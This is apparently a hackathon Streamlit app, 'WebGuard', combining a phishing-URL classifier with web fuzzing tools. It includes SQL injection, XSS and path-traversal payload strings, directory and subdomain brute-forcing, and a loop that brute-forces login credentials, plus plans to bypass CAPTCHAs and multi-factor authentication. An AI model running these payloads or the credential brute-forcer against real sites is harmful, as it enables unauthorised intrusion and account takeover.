# # -*- coding: utf-8 -*-
# """HACKX.ipynb
# Automatically generated by Colaboratory.
# Original file is located at
#     https://colab.research.google.com/drive/13PhvS9RucBMO-DViNrLIu1aaYttGWiT0
# """
# import streamlit as st
# import pickle
# import pandas as pd
# from extract_features import ExtractFeatures
# from PIL import Image
# image2 = Image.open('muj logo.png')
# image = Image.open('hackxlogowhite.png')
# col1, col2, col3 = st.columns([0.001, 8, 3])
# with col2:
#     st.image(image2, width=200)
# with col3:
#     st.image(image, width=200)
# st.markdown(
#     "<div style='display: flex; align-items: center; margin-bottom: -35px;'>"
#     "<h1 style='color:#F862FC; margin-center: 10px;'>404 Not Found,</h1>"
#     "</div>"
#     "<h1 style='color:black; margin-center: 10px;'>But We Found It!</h1>"
#     "</div>",
#     unsafe_allow_html=True
# )
# @st.cache_resource
# def get_model():
#     """
#     Loads the phishing URL detection model from a pickle file.
#     This function reads and loads a pickled file containing the classifier.
#     Returns:
#         object: The loaded phishing URL detection model.
#     Note:
#         The model should be saved in a file named 'phishing_url_detector.pkl'.
#         XGBoost module must be installed before using the file.
#     """
#     with open('phishing_url_detector.pkl', 'rb') as pickle_model:
#         phishing_url_detector = pickle.load(pickle_model)
#     return phishing_url_detector
# # Takes in user input
# input_url = st.text_area("Are you sure your 'bank' sent that link?")
# if input_url != "":
#     # Extracts features from the URL and converts it into a dataframe
#     features_url = ExtractFeatures().url_to_features(url=input_url)
#     features_dataframe = pd.DataFrame.from_dict([features_url])
#     features_dataframe = features_dataframe.fillna(-1)
#     features_dataframe = features_dataframe.astype(int)
#     st.write("Snooping around...")
#     st.cache_data.clear()
#     prediction_str = ""
# import requests
# # Function to check if a URL returns a 404 error
# def check_404(url):
#     try:
#         response = requests.head(url)  # Use HEAD request for faster checking
#         return response.status_code == 404
#     except requests.RequestException:
#         return False
# # Function to brute force valid URLs
# def brute_force_url(base_url):
#     # This is a simple wordlist for the sake of demonstration.
#     # In real scenarios, you might read from a .txt file.
#     wordlist = ['about', 'contact', 'login', 'signup', 'user', 'admin']
#     found_urls = []
#     for word in wordlist:
#         # Construct new URL to check
#         new_url = base_url + "/" + word
#         if not check_404(new_url):
#             found_urls.append(new_url)
#     return found_urls
# if input_url != "":
#     # Initialize a variable to store the final URL
#     final_url = input_url
#     # Check if the input URL ends with "404/" and remove it
#     if input_url.endswith("404/"):
#         final_url = input_url.rsplit("404/", 1)[0]
#         st.write(f"{input_url} - Removed '404/': {final_url}")
#     try:
#         response = requests.get(final_url)  # Send a GET request to the URL
#         if response.status_code == 200:
#             st.write(f"{final_url} Status: 200 (OK) - The website is live and running")
#         else:
#             st.write(f"{final_url} Status: {response.status_code} - The website may have issues")
    
#         if check_404(final_url):
#             st.write(f"{final_url} Status: 404 (Not Found) - Initiating Brute Force")
    
#             # Try to brute force the correct URL by modifying the final_url
#             possible_urls = brute_force_url(final_url)
#             if possible_urls:
#                 final_url = possible_urls[0]  # Use the first valid URL found
#                 st.write(f"Brute-forced URL: {final_url}")
#             else:
#                 st.write("No valid URLs found based on the wordlist")
#     except requests.RequestException as e:
#         st.write(f"{final_url} NA FAILED TO CONNECT {str(e)}")
#     except Exception as e:
#         print(e)
#         st.error("Not sure what went wrong. We'll get back to you shortly.")
#     features_url = ExtractFeatures().url_to_features(url=final_url)
#     features_dataframe = pd.DataFrame.from_dict([features_url])
#     features_dataframe = features_dataframe.fillna(-1)
#     features_dataframe = features_dataframe.astype(int)
#     # st.write("Snooping around...")
#     st.cache_data.clear()
#     prediction_str = ""
#     # Predict outcome using extracted features
#     try:
#         phishing_url_detector = get_model()
#         prediction = phishing_url_detector.predict(features_dataframe)
#         if prediction == int(True):
#             prediction_str = 'This website might be malicious!'
#         elif prediction == int(False):
#             prediction_str = 'Website is safe to proceed!'
#         else:
#             prediction_str = ''
#         st.write(prediction_str)
#         st.write(features_dataframe)
#     except Exception as e:
#         print(e)
#         st.error("Not sure what went wrong. We'll get back to you shortly!")
# else:
#     st.write("")
# import requests
# # List of username and password pairs to try
# usernames = ['user1', 'user2', 'admin']
# passwords = ['password1', 'password2', '123456']
# # Target URL with a login portal
# login_url = 'https://example.com/login'  # Replace with the actual URL
# # Session object to maintain the session cookies
# session = requests.Session()
# # Loop through the username and password pairs
# for username in usernames:
#     for password in passwords:
#         # Prepare the login data
#         login_data = {
#             'username': username,
#             'password': password
#         }
  
#         response = session.post(login_url, data=login_data)
#         # Check if the login was successful based on the response
#         if 'Login Successful' in response.text:
#             print(f"Successful login - Username: {username}, Password: {password}")
#             break
# # Close the session
# session.close()
# # st.markdown("### *No Ma'am, He's NOT Calling From Microsoft !*")
# st.markdown("Our chosen problem statement focussed on Web Safety through URL fuzzing,status check and bruteforcing exceptions and authentications.We employed the most viable ML models,exception handling systems and basic HTTPS request calls to deliver these features. Please try the interactive input above and let us know your feedback.")
# st.markdown("### *Key Objectives*")
# st.markdown("- URL-Based Feature Extraction and Fuzzing: Machine Learning Based Approaches for determining the authenticity of input URL through fuzzing.")
# st.markdown("- Live URL Detection: Utilizes HTTPS GET command calling input URL as argument and obtains site status in console log,which is then brought about in frontend as corresponding message.")
# st.markdown("- Checkmate 404s: Bruteforcing URL additions/removal to resolve 404 error using predefined appending/prepending vocabulary .")
# st.markdown("- Houston,I'm In: Iterating through combinations of usernames and passwords in a bruteforce approach to attempt login authentication of input URL")
# st.markdown("### *Results*")
# st.markdown("Our solution provides a robust and reliable method for delivering the mentioned features.A lot of scope for future work is possible,due to the intensive constraints of the HACKX Hackathon and our steady increase of expertise in the field. We aim to pursue this idea even after the event,forming an industry-scalable solution even more well-rounded than our current prototype!Please feel free to contact any of our team members if you want to contribute.")


# -*- coding: utf-8 -*-
"""
WebGuard: A Comprehensive Fuzzer for Web Application Security
Automatically generated by Colaboratory.
Original file is located at
    https://colab.research.google.com/drive/13PhvS9RucBMO-DViNrLIu1aaYttGWiT0
"""

import streamlit as st
import pickle
import pandas as pd
from extract_features import ExtractFeatures
from PIL import Image
import requests
import dns.resolver
from urllib.parse import urljoin

# Load images
image2 = Image.open('webguard.jpg')
image = Image.open('sihlogo.jpg')

# Streamlit UI for logos
col1, col2, col3 = st.columns([0.001, 8, 3])
with col2:
    st.image(image2, width=175)
with col3:
    st.image(image, width=175)

st.markdown(
    "<div style='display: flex; align-items: center; margin-bottom: -35px;'>"
    "<h1 style='color:#F862FC; margin-center: 10px;'>WebGuard:</h1>"
    "</div>"
    "<h1 style='color:black; margin-center: 10px;'>A Comprehensive Fuzzer for Web Application Security</h1>",
    unsafe_allow_html=True
)


# Caching the phishing URL detection model
@st.cache_resource
def get_model():
    with open('phishing_url_detector.pkl', 'rb') as pickle_model:
        phishing_url_detector = pickle.load(pickle_model)
    return phishing_url_detector

# Directory enumeration and file brute-forcing
COMMON_DIRECTORIES = ["admin", "login", "test", "backup"]
COMMON_EXTENSIONS = [".php", ".html", ".asp", ".js"]
COMMON_SUBDOMAINS = ["www", "api", "mail", "ftp"]

# Function to check if a URL returns a 404 error
def check_404(url):
    try:
        response = requests.head(url, timeout=10)  # Use HEAD request for faster checking
        return response.status_code == 404
    except requests.RequestException:
        return False

# Function to brute force valid URLs (directories and files)
def brute_force_url(base_url):
    found_urls = []
    for directory in COMMON_DIRECTORIES:
        for ext in COMMON_EXTENSIONS:
            full_url = urljoin(base_url, f"{directory}{ext}")
            if not check_404(full_url):
                found_urls.append(full_url)
    return found_urls

# Function to brute force Virtual Hosts (subdomains)
def fuzz_virtual_hosts(domain):
    found_vhosts = []
    for subdomain in COMMON_SUBDOMAINS:
        vhost = f"{subdomain}.{domain}"
        try:
            response = requests.get(f"http://{vhost}", timeout=10)
            if response.status_code == 200:
                found_vhosts.append(vhost)
        except requests.RequestException:
            continue
    return found_vhosts

# API endpoint fuzzing
API_ENDPOINTS = ["/api/v1/", "/api/v2/", "/api/user/", "/api/admin/"]
def test_api_endpoints(base_url):
    found_endpoints = []
    for endpoint in API_ENDPOINTS:
        full_url = urljoin(base_url, endpoint)
        try:
            response = requests.get(full_url, timeout=10)
            if response.status_code == 200:
                found_endpoints.append(full_url)
        except requests.RequestException:
            continue
    return found_endpoints

# URL parameter fuzzing
def fuzz_parameters(base_url):
    payloads = ["' OR 1=1 --", "<script>alert('XSS')</script>", "../etc/passwd"]
    found_vulnerabilities = []
    for payload in payloads:
        fuzzed_url = f"{base_url}?param={payload}"
        try:
            response = requests.get(fuzzed_url, timeout=10)
            if response.status_code == 200:
                found_vulnerabilities.append(fuzzed_url)
        except requests.RequestException:
            continue
    return found_vulnerabilities

# Subdomain brute force discovery
def discover_subdomains(domain):
    found_subdomains = []
    for subdomain in COMMON_SUBDOMAINS:
        try:
            resolved = dns.resolver.resolve(f"{subdomain}.{domain}", 'A')
            found_subdomains.append(f"{subdomain}.{domain}")
        except (dns.resolver.NXDOMAIN, dns.resolver.Timeout):
            continue
    return found_subdomains

# Original code starts here
# Takes in user input
input_url = st.text_area("Please paste your URL below for security analysis:")
if input_url != "":
    # Extracts features from the URL and converts it into a dataframe
    features_url = ExtractFeatures().url_to_features(url=input_url)
    features_dataframe = pd.DataFrame.from_dict([features_url])
    features_dataframe = features_dataframe.fillna(-1)
    features_dataframe = features_dataframe.astype(int)
    st.write("Snooping around...")
    st.cache_data.clear()
    prediction_str = ""

    # Function to check if a URL returns a 404 error
    def check_404(url):
        try:
            response = requests.head(url)  # Use HEAD request for faster checking
            return response.status_code == 404
        except requests.RequestException:
            return False

    # Function to brute force valid URLs
    def brute_force_url(base_url):
        # This is a simple wordlist for the sake of demonstration.
        # In real scenarios, you might read from a .txt file.
        wordlist = ['about', 'contact', 'login', 'signup', 'user', 'admin']
        found_urls = []
        for word in wordlist:
            # Construct new URL to check
            new_url = base_url + "/" + word
            if not check_404(new_url):
                found_urls.append(new_url)
        return found_urls

    if input_url != "":
        # Initialize a variable to store the final URL
        final_url = input_url
        # Check if the input URL ends with "404/" and remove it
        if input_url.endswith("404/"):
            final_url = input_url.rsplit("404/", 1)[0]
            st.write(f"{input_url} - Removed '404/': {final_url}")
        try:
            response = requests.get(final_url)  # Send a GET request to the URL
            if response.status_code == 200:
                st.write(f"{final_url} Status: 200 (OK) - The website is live and running")
            else:
                st.write(f"{final_url} Status: {response.status_code} - The website may have issues")

            if check_404(final_url):
                st.write(f"{final_url} Status: 404 (Not Found) - Initiating Brute Force")

                # Try to brute force the correct URL by modifying the final_url
                possible_urls = brute_force_url(final_url)
                if possible_urls:
                    final_url = possible_urls[0]  # Use the first valid URL found
                    st.write(f"Brute-forced URL: {final_url}")
                else:
                    st.write("No valid URLs found based on the wordlist")
        except requests.RequestException as e:
            st.write(f"{final_url} NA FAILED TO CONNECT {str(e)}")
        except Exception as e:
            print(e)
            st.error("Not sure what went wrong. We'll get back to you shortly.")

        # Extract and predict using model
        features_url = ExtractFeatures().url_to_features(url=final_url)
        features_dataframe = pd.DataFrame.from_dict([features_url])
        features_dataframe = features_dataframe.fillna(-1)
        features_dataframe = features_dataframe.astype(int)
        st.cache_data.clear()
        prediction_str = ""
        try:
            phishing_url_detector = get_model()
            prediction = phishing_url_detector.predict(features_dataframe)
            if prediction == int(True):
                prediction_str = 'This website might be malicious!'
            elif prediction == int(False):
                prediction_str = 'Website is safe to proceed!'
            else:
                prediction_str = ''
            st.write(prediction_str)
            st.write(features_dataframe)
        except Exception as e:
            print(e)
            st.error("Not sure what went wrong. We'll get back to you shortly!")
else:
    st.write("")

# Username and password brute-force
usernames = ['user1', 'user2', 'admin']
passwords = ['password1', 'password2', '123456']
login_url = 'https://example.com/login'  # Replace with the actual URL

# Session object to maintain the session cookies
session = requests.Session()

# Loop through the username and password pairs
for username in usernames:
    for password in passwords:
        # Prepare the login data
        login_data = {
            'username': username,
            'password': password
        }

        response = session.post(login_url, data=login_data)
        if 'Login Successful' in response.text:
            print(f"Successful login - Username: {username}, Password: {password}")
            break

# Close the session
session.close()

# Summary of the solution
# Summary of the solution
st.markdown("Our chosen problem statement focused on Web Safety through URL fuzzing, status check, and brute-forcing exceptions and authentications. Please try the interactive input above and let us know your feedback.")
st.markdown("### *Key Objectives*")
st.markdown("- **URL-Based Feature Extraction and Fuzzing**: Machine Learning-Based Approaches for determining the authenticity of an input URL.")
st.markdown("- **Live URL Detection**: Uses HTTPS GET command to call the input URL as an argument, obtaining the site status and displaying the result in the frontend.")
st.markdown("- **404 Error Handling**: Brute-forcing URL modifications to resolve 404 errors using predefined vocabulary for appending/prepending.")
st.markdown("- **Login Authentication Testing**: Attempts login authentication using brute-force methods, iterating through different username and password combinations.")

# Display Results Section
st.markdown("### *Results*")
st.markdown("Our solution provides a robust and reliable method for delivering the mentioned features. Although it was developed under time constraints for the Smart India, we believe that with more time and resources, this prototype can evolve into an industry-scalable solution. Feel free to contact any of our team members if you'd like to contribute!")

# Closing Remarks
st.markdown("### *Future Enhancements*")
st.markdown("- Add more sophisticated payloads for fuzzing URL parameters to cover a wider range of vulnerabilities.")
st.markdown("- Enhance the login brute-force function with support for CAPTCHAs and multi-factor authentication bypass.")
st.markdown("- Integrate results into a comprehensive reporting format that details vulnerability findings with severity ratings.")
st.markdown("- Implement multi-threading to speed up brute-forcing tasks.")
